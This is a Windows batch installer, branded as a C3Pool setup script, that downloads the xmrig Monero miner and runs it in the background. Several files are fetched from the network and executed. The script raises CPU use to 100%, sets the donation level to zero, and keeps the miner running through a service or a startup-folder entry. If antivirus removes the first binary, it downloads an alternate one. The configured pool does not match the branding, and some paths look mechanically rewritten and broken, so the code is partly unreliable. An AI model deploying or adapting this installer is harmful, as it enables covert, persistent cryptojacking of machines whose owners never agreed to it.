@echo off
set VERSION=2.4

rem printing greetings

echo C3Pool mining setup script v%VERSION%.
echo ^(please report issues to support@c3pool.com email^)
echo.

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

rem command line arguments
set WALLET=%1
rem this one is optional
set EMAIL=%2

rem checking prerequisites

if [%WALLET%] == [] (
  echo Script usage:
  echo ^> setup_c3pool_miner.bat ^<wallet address or USDT TRC20 address^> [^<your email address^>]
  echo ERROR: Please specify your wallet address
  exit /b 1
)

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  34 goto WALLET_LEN_OK
echo ERROR: Wrong wallet address length (should be 106, 95, or 34 for USDT TRC20): %WALLET_BASE_LEN%
exit /b 1

:WALLET_LEN_OK

if ["C:\ProgramData"] == [""] (
  echo ERROR: Please make sure C:\ProgramData directory is accessible
  exit /b 1
)

if not exist "C:\ProgramData" (
  echo ERROR: Please make sure C:\ProgramData directory exists
  exit /b 1
)

where wmic >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "wmic" utility to work correctly
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "powershell" utility to work correctly
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "find" utility to work correctly
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "findstr" utility to work correctly
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  echo ERROR: This script requires "tasklist" utility to work correctly
  exit /b 1
)

rem calculating port

for /f "tokens=*" %%a in ('wmic cpu get SocketDesignation /Format:List ^| findstr /r /v "^$" ^| find /c /v ""') do set CPU_SOCKETS=%%a
if [%CPU_SOCKETS%] == [] ( 
  echo WARNING: Can't get CPU sockets from wmic output
  set CPU_SOCKETS=1
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfCores /Format:List ^| findstr /r /v "^$"') do set CPU_CORES_PER_SOCKET=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_CORES_PER_SOCKET%") do set CPU_CORES_PER_SOCKET=%%b
if [%CPU_CORES_PER_SOCKET%] == [] ( 
  echo WARNING: Can't get CPU cores per socket from wmic output
  set CPU_CORES_PER_SOCKET=1
)

for /f "tokens=*" %%a in ('wmic cpu get NumberOfLogicalProcessors /Format:List ^| findstr /r /v "^$"') do set CPU_THREADS=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_THREADS%") do set CPU_THREADS=%%b
if [%CPU_THREADS%] == [] ( 
  echo WARNING: Can't get CPU cores from wmic output
  set CPU_THREADS=1
)
set /a "CPU_THREADS = %CPU_SOCKETS% * %CPU_THREADS%"

for /f "tokens=*" %%a in ('wmic cpu get MaxClockSpeed /Format:List ^| findstr /r /v "^$"') do set CPU_MHZ=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_MHZ%") do set CPU_MHZ=%%b
if [%CPU_MHZ%] == [] ( 
  echo WARNING: Can't get CPU MHz from wmic output
  set CPU_MHZ=1000
)

for /f "tokens=*" %%a in ('wmic cpu get L2CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L2_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L2_CACHE%") do set CPU_L2_CACHE=%%b
if [%CPU_L2_CACHE%] == [] ( 
  echo WARNING: Can't get L2 CPU cache from wmic output
  set CPU_L2_CACHE=256
)

for /f "tokens=*" %%a in ('wmic cpu get L3CacheSize /Format:List ^| findstr /r /v "^$"') do set CPU_L3_CACHE=%%a
for /f "tokens=1,* delims==" %%a in ("%CPU_L3_CACHE%") do set CPU_L3_CACHE=%%b
if [%CPU_L3_CACHE%] == [] ( 
  echo WARNING: Can't get L3 CPU cache from wmic output
  set CPU_L3_CACHE=2048
)

set /a "TOTAL_CACHE = %CPU_SOCKETS% * (%CPU_L2_CACHE% + %CPU_L3_CACHE%)" 2>nul
if [%TOTAL_CACHE%] == [] set TOTAL_CACHE=0
set /a "CACHE_THREADS = %TOTAL_CACHE% / 2048" 2>nul
if [%CACHE_THREADS%] == [] set CACHE_THREADS=1

set PORT=80

:PORT_OK

rem printing intentions

set "LOGFILE=C:\ProgramData\c3pool\xmrig.log"

echo I will download, setup and run in background Monero CPU miner with logs in %LOGFILE% file.
echo If needed, miner in foreground can be started by C:\ProgramData\c3pool\miner.bat script.
echo Mining will happen to %WALLET% wallet.

if not [%EMAIL%] == [] (
  echo ^(and %EMAIL% email as password to modify wallet options later at https://c3pool.com site^)
)

echo.

if %ADMIN% == 0 (
  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
) else (
  echo Mining in background will be performed using c3pool_miner service.
)

echo.
echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total.
echo.

rem pause

rem start doing stuff: preparing miner

echo [*] Removing previous c3pool miner (if any)
sc stop c3pool_miner
sc delete c3pool_miner
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
echo [*] Removing "C:\ProgramData\c3pool" directory
timeout 5
rmdir /q /s "C:\ProgramData\c3pool" >NUL 2>NUL
IF EXIST "C:\ProgramData\c3pool" GOTO REMOVE_DIR0

echo [*] Downloading c3pool advanced version of xmrig to "C:\ProgramData\xmrig.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/xmrig.zip', 'C:\ProgramData\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download c3pool advanced version of xmrig
  goto MINER_BAD
)

echo [*] Unpacking "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\xmrig.zip', 'C:\ProgramData\c3pool')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\xmrig.zip" >NUL
  del "C:\ProgramData\7za.exe"
)
del "C:\ProgramData\xmrig.zip"

echo [*] Checking if advanced version of "C:\ProgramData\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
"C:\ProgramData\c3pool\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD

if exist "C:\ProgramData\c3pool\xmrig.exe" (
  echo WARNING: Advanced version of "C:\ProgramData\c3pool\xmrig.exe" is not functional
) else (
  echo WARNING: Advanced version of "C:\ProgramData\c3pool\xmrig.exe" was removed by antivirus
)

echo [*] Looking for the latest version of Monero miner
for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

echo [*] Downloading "%MINER_LOCATION%" to "C:\ProgramData\xmrig.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', 'C:\ProgramData\xmrig.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "C:\ProgramData\xmrig.zip"
  exit /b 1
)

:REMOVE_DIR1
echo [*] Removing "C:\ProgramData\c3pool" directory
timeout 5
rmdir /q /s "C:\ProgramData\c3pool" >NUL 2>NUL
IF EXIST "C:\ProgramData\c3pool" GOTO REMOVE_DIR1

echo [*] Unpacking "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\xmrig.zip', 'C:\ProgramData\c3pool')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking advanced "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\xmrig.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "C:\ProgramData\xmrig.zip" to "C:\ProgramData\c3pool"
    exit /b 1
  )
  del "C:\ProgramData\7za.exe"
)
del "C:\ProgramData\xmrig.zip"

echo [*] Checking if stock version of "C:\ProgramData\c3pool\xmrig.exe" works fine ^(and not removed by antivirus software^)
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
"C:\ProgramData\c3pool\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK

if exist "C:\ProgramData\c3pool\xmrig.exe" (
  echo WARNING: Stock version of "C:\ProgramData\c3pool\xmrig.exe" is not functional
) else (
  echo WARNING: Stock version of "C:\ProgramData\c3pool\xmrig.exe" was removed by antivirus
)

exit /b 1

:MINER_OK

echo [*] Miner "C:\ProgramData\c3pool\xmrig.exe" is OK

for /f "tokens=*" %%a in ('powershell -Command "hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}"') do set PASS=%%a
if [%PASS%] == [] (
  set PASS=na
)
if not [%EMAIL%] == [] (
  set "PASS=%PASS%:%EMAIL%"
)

powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"pool.supportxmr.com:3333\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config.json'" 

copy /Y "C:\ProgramData\c3pool\config.json" "C:\ProgramData\c3pool\config_background.json" >NUL
powershell -Command "$out = cat 'C:\ProgramData\c3pool\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII 'C:\ProgramData\c3pool\config_background.json'" 

rem preparing script
(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo echo Monero miner is already running in the background. Refusing to run another one.
echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
echo :EXIT
) > "C:\ProgramData\c3pool\miner.bat"

rem preparing script background work and work under reboot

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "C:\ProgramData\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=C:\ProgramData\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "C:\ProgramData\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=C:\ProgramData\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

echo ERROR: Can't find Windows startup directory
exit /b 1

:STARTUP_DIR_OK
echo [*] Adding call to "C:\ProgramData\c3pool\miner.bat" script to "%STARTUP_DIR%\c3pool_miner.bat" script
(
echo @echo off
echo "C:\ProgramData\c3pool\miner.bat" --config="C:\ProgramData\c3pool\config_background.json"
) > "%STARTUP_DIR%\c3pool_miner.bat"

echo [*] Running miner in the background
call "%STARTUP_DIR%\c3pool_miner.bat"
goto OK

:ADMIN_MINER_SETUP

echo [*] Downloading tools to make c3pool_miner service to "C:\ProgramData\nssm.zip"
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/nssm.zip', 'C:\ProgramData\nssm.zip')"
if errorlevel 1 (
  echo ERROR: Can't download tools to make c3pool_miner service
  exit /b 1
)

echo [*] Unpacking "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\nssm.zip', 'C:\ProgramData\c3pool')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "C:\ProgramData\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/c3pool/xmrig_setup/master/7za.exe', 'C:\ProgramData\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "C:\ProgramData\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
  "C:\ProgramData\7za.exe" x -y -o"C:\ProgramData\c3pool" "C:\ProgramData\nssm.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "C:\ProgramData\nssm.zip" to "C:\ProgramData\c3pool"
    exit /b 1
  )
  del "C:\ProgramData\7za.exe"
)
del "C:\ProgramData\nssm.zip"

echo [*] Creating c3pool_miner service
sc stop c3pool_miner
sc delete c3pool_miner
"C:\ProgramData\c3pool\nssm.exe" install c3pool_miner "C:\ProgramData\c3pool\xmrig.exe"
if errorlevel 1 (
  echo ERROR: Can't create c3pool_miner service
  exit /b 1
)
"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppDirectory "C:\ProgramData\c3pool"
"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppStdout "C:\ProgramData\c3pool\stdout"
"C:\ProgramData\c3pool\nssm.exe" set c3pool_miner AppStderr "C:\ProgramData\c3pool\stderr"

echo [*] Starting c3pool_miner service
"C:\ProgramData\c3pool\nssm.exe" start c3pool_miner
if errorlevel 1 (
  echo ERROR: Can't start c3pool_miner service
  exit /b 1
)

echo
echo Please reboot system if c3pool_miner service is not activated yet (if "C:\ProgramData\c3pool\xmrig.log" file is empty)
goto OK

:OK
echo
echo [*] Setup complete
pause
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b
